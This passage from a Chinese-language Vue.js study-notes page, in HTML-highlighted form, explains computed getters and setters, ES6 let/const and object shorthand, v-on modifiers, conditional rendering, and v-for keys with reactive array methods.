class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>### 3.3 计算属性的setter和getter+ 每个计算属性都包含一个setter和getter+ 上述例子只使用了getter+ 某些情况下也会需要setter方法（不常用）+ 例如：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;fullname&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>  <span class="comment">&lt;!-- 就算是有get set 也不加() --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">firstname</span>:<span class="string">&#x27;lebron&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">lastname</span>:<span class="string">&#x27;james&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fullname</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">set</span>:<span class="keyword">function</span>(<span class="params">newname</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">const</span> names = newname.<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">this</span>.<span class="property">fristname</span> = names[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">this</span>.<span class="property">lastname</span>= names[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">get</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstname</span> + <span class="string">&#x27; &#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastname</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            </span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//因为一般只有get属性 只读 所以就可以简写成下面</span></span></span><br><span class="line"><span class="language-javascript">          <span class="comment">//fullname:&#123;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//    get:function()&#123;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//        return this.firstname + &#x27; &#x27; + this.lastname;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//    &#125;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//&#125;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//fullname:function()&#123;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//    return this.firstname + &#x27; &#x27; + this.lastname;</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//&#125;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>### 3.4 计算属性的缓存计算属性和methods的区别 在多次调用时：+ 计算属性只会调用一次，内部有缓存，如果值不变，就不会再调用，会直接使用，性能比较高+ methods会调用多次，每次都会重新计算，性能较低所以更多使用计算属性会比较好## 4.es6补充（p26-29）### 4.1 let/var 块级作用域+ 变量作用域：变量能够使用的范围  + 没有块级作用域引起的问题：if的块级  + 没有块级作用域引起的问题：for的块级    <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btns = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; btns.<span class="property">length</span>; i++)&#123;</span><br><span class="line">     <span class="comment">//因为i的作用域问题  所以会i一直都是btns.length</span></span><br><span class="line">    btns[i].<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;第&#x27;</span> + i + <span class="string">&#x27;个按钮被点击&#x27;</span> ); </span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//解决一：闭包（立即执行函数）</span></span><br><span class="line">    <span class="comment">//原因：函数是一个作用域</span></span><br><span class="line">    (<span class="keyword">function</span>(<span class="params">i</span>)&#123;</span><br><span class="line">     btns[i].<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;第&#x27;</span> + i + <span class="string">&#x27;个按钮被点击&#x27;</span> ); </span><br><span class="line">    &#125;)</span><br><span class="line">    &#125;)(i)</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  + es5之前因为if和for都没有块级作用域的概念，所以再很多时候，都必须借助于function的作用域来解决应用外面变量的问题+ es6中，let有if和for的块级作用域### 4.2 const的使用es6开发中，优先使用const，只有需要改变一个标识符时才使用let+ 给const修饰的标识符被赋值后，不能再改变+ 再使用const定义标识符，必须进行赋值+ 常量的含义是指向对象不能修改，但是对象内部的属性可以修改### 4.3 对象字面量的增强写法<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//字面量</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>#### 1.属性的增强写法<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;why&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> age = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">const</span> height = <span class="number">1.88</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//es5的写法</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">name</span>:name,</span><br><span class="line">    <span class="attr">age</span>:age,</span><br><span class="line">    <span class="attr">height</span>:height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//es6的写法</span></span><br><span class="line"><span class="keyword">const</span> obj =&#123;</span><br><span class="line">    name,</span><br><span class="line">    age,</span><br><span class="line">    height</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>#### 2.函数的增强写法<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//es5的写法</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">run</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">eat</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//es6的写法</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="title function_">run</span>(<span class="params"></span>)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">eat</span>(<span class="params"></span>)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>## 5. v-on事件监听（p30-32）### 5.1 v-on基本使用+ 作用：绑定事件监听器+ 缩写：@+ 预期：Function|Inline Statement|Object+ 参数：event  ### 5.2 v-on参数问题+ $event<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 1.事件调用的方法没有参数 ()可省略--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick()&quot;</span>&gt;</span>按钮1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btnClick&quot;</span>&gt;</span>按钮1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2.有参数时,若只写()没有传参 那么与普通对象一样 形参为undefined --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 若没有写() vue会默认将浏览器生产的event事件对象作为参数传入方法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn2Click(123)&quot;</span>&gt;</span>按钮2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn2Click()&quot;</span>&gt;</span>按钮2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn2Click&quot;</span>&gt;</span>按钮2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 3.在方法定义时，需要参数又需要event --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 在调用方法，手动获取到浏览器参数的event对象：$event --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;btn3Click(123,$event)&quot;</span>&gt;</span>按钮3<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">     <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">     <span class="attr">data</span>:&#123;&#125;,</span></span><br><span class="line"><span class="language-javascript">     <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="title function_">btnClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">             </span></span><br><span class="line"><span class="language-javascript">         &#125;,</span></span><br><span class="line"><span class="language-javascript">         <span class="title function_">btn2Click</span>(<span class="params">abc</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;----&quot;</span>,abc);</span></span><br><span class="line"><span class="language-javascript">         &#125;,</span></span><br><span class="line"><span class="language-javascript">         <span class="title function_">btn3Click</span>(<span class="params">abc,event</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">             <span class="variable language_">console</span>.<span class="title function_">log</span>(abc,event);</span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">     &#125;</span></span><br><span class="line"><span class="language-javascript"> &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>### 5.3 v-on 修饰符+ .stop - 调用event.stopPropagation()+ .prevent - 调用event.preventDefault()+ .&#123;keyCode | keyAlias&#125; -只当事件是从特定键触发时才触发回调+ .native - 监听组件根元素的原生事件+ .once - 只触发一次回调<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;app&#x27;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1..stop修饰符的使用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> @<span class="attr">click</span>=<span class="string">&quot;divClick&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- if 不加 .stop 点击按钮也会点击到div 会触发事件冒泡 .stop 阻止事件冒泡--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.stop</span>=<span class="string">&#x27;btnClick&#x27;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 2..prevent --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;baidu&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- if 不加 会自动提交表单 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;提交&#x27;</span> @<span class="attr">click.prevent</span>=<span class="string">&#x27;submitClick&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 3. 监听某个键盘的键帽 keyup 松开键盘的时候触发--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">keyup.enter</span>=<span class="string">&quot;keyup&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 4. .once 只会触发一次--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&#x27;btnClick&#x27;</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">btnClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;btnClick&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">divClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;divClick&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">submitClick</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;submitClick&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">keyup</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;keyup&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>## 6.条件判断v-if、v-else-if、v-else、v-show(p33-36)+ 这三个指令与JavaScript的条件语句if、else、else if、类似+ Vue的条件指令可以根据表达式的值在DOM中渲染或销毁元素或组件+ v-if的原理：  + v-if的值为false时，对应的元素及其子元素不会渲染  + 不会有对应的标签出现在DOM中### 6.1 v-if、v-else<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>isShow为true时显示<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-else</span>&gt;</span>isShow为false时显示<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 如果有这样的情况 建议用computed做 不建议使用这么复杂的标签做 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-if</span>=<span class="string">&quot;score &gt;= 90&quot;</span>&gt;</span>优秀<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-else-if</span>=<span class="string">&quot;score &gt;= 80&quot;</span>&gt;</span>良好<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-else-if</span>=<span class="string">&quot;score &gt;= 60&quot;</span>&gt;</span>及格<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-else</span>&gt;</span>不及格<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isShow</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">score</span>:<span class="number">99</span>,</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>### 6.2 账号/邮箱登录 input复用的问题解决（p34-p35）+ 在两个input上+不同的key的值就可以了+ Vue ：在Dom渲染页面的时候会经过一层虚拟dom然后将相似的不会冲突的元素只渲染一遍+ 所以用不同的key把两个分开+ 这样就不会出现切换input时 input里面的value还存在的问题了### 6.3 v-showv-if：为false时，不会存在dom，删除/重新创建v-show：为flase，display：none；block/none    切换频率高时，使用## 7.循环遍历（p37-44）### 7.1 v-for 遍历数组和对象1. 数组: `<p v-for="(item,index) in arr">&#123;&#123; index+1 &#125;&#125; &#123;&#123; item &#125;&#125;&lt;/p&gt;</code></li></ul><ol start="2"><li>对象:<code>&lt;li v-for=&quot;(value,key,index) in info&quot;&gt;&lt;/li&gt;</code></li></ol><h3 id="7.2-v-for绑定与不绑定key的区别">7.2 v-for绑定与不绑定key的区别<a title="#7.2-v-for绑定与不绑定key的区别" href="#7.2-v-for绑定与不绑定key的区别"></a></h3><h5 id="插入函数-splice-:">插入函数 splice :<a title="#插入函数-splice-:" href="#插入函数-splice-:"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> letters = [<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>,<span class="string">&quot;E&quot;</span>];</span><br><span class="line">letters.<span class="title function_">splice</span>(<span class="number">2</span>,<span class="number">2</span>); <span class="comment">//返回[&quot;C&quot;,&quot;D&quot;]</span></span><br><span class="line"><span class="comment">// letters = [&quot;A&quot;,&quot;B&quot;,&quot;E&quot;];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> letters = [<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>,<span class="string">&quot;E&quot;</span>];</span><br><span class="line">letters.<span class="title function_">splice</span>(<span class="number">2</span>,<span class="number">0</span>,<span class="string">&quot;F&quot;</span>);  <span class="comment">//返回[]</span></span><br><span class="line"><span class="comment">//[&quot;A&quot;,&quot;B&quot;,&quot;F&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;]</span></span><br></pre></td></tr></table></figure><h5 id="绑定key的格式：">绑定key的格式：<a title="#绑定key的格式：" href="#绑定key的格式："></a></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in letters&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;item&quot;</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="组件的key属性">组件的key属性<a title="#组件的key属性" href="#组件的key属性"></a></h5><ul><li><p>官方推荐在使用<code>v-for</code>时，给对应的元素/组件添加上<code>:key</code>属性</p></li><li><blockquote><p>2.2.0+ 的版本里，<strong>当在组件中使用</strong> v-for 时，key 现在是必须的。因为没有key来保障循环中的唯一性，那么组件则会被打乱。</p><p>当 Vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用 “<strong>就地复用</strong>” 策略。如果数据项的顺序被改变，Vue将<strong>不是移动 DOM 元素来匹配数据项的顺序</strong>， 而是<strong>简单复用此处每个元素</strong>，并且确保它在特定索引下显示已被渲染过的每个元素。</p><p>为了给 Vue 一个提示，<strong>以便它能跟踪每个节点的身份，从而重用和重新排序现有元素</strong>，你需要为每项提供一个唯一 key 属性。</p></blockquote></li><li><p>原因：和Vue的虚拟DOM的Diff（顺序表的插入）算法有关</p></li><li><p>所以我们需要使用key来给每个节点做一个唯一标识符，Diff算法就可以正确的识别此节点，找到正确的位置区插入新的节点</p></li><li><p>key的作用主要是为了高效的更新虚拟DOM</p></li></ul><h3 id="7.3-那些数组的方法是响应式的">7.3 那些数组的方法是响应式的<a title="#7.3-那些数组的方法是响应式的" href="#7.3-那些数组的方法是响应式的"></a></h3><ol><li>push() ：可以跟多个</li><li>pop()  :删除数组最后一个元素</li><li>shift()：删除数组的第一个元素</li><li>unshift()：在第一个前面增加元素 ，可以传多个值</li><li>splice()：删除/插入/替换元素</li><li>sort()：</li><li>reverse()：</li></ol><ul><li><p><font color='red'>注意：通过索引值修改数组中的元素 这个方法不是响应式的</font></p><blockquote><p>页面的元素不会响应式地改变 但是控制台上面的数据就换了</p></blockquote><ul><li>可以使用splice</li><li>使用Vue.set(this.letters,0,‘bbbb’);</li></ul></li></ul><h3 id="7.4-作业+案例">7.4 作业+案例<a title="#7.4-作业+案例" href="#7.4-作业+案例"></a></h3><ul><li>保留两位小数 <code>&#123;&#123; item.price.toFixed(2) &#125;&#125;</code></li><li>过滤器： （使用过滤器做这个功能会比较适合）</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; &#x27;￥&#x27; + item.price.toFixed(2) &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; getFinalPrice(item.price) &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;td&gt;&#123;&#123; item.price | 过滤器 &#125;&#125;&lt;/td&gt;  过滤器是有参数的 直接把|前面的作为参数传入  --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; item.price | showPrice &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span 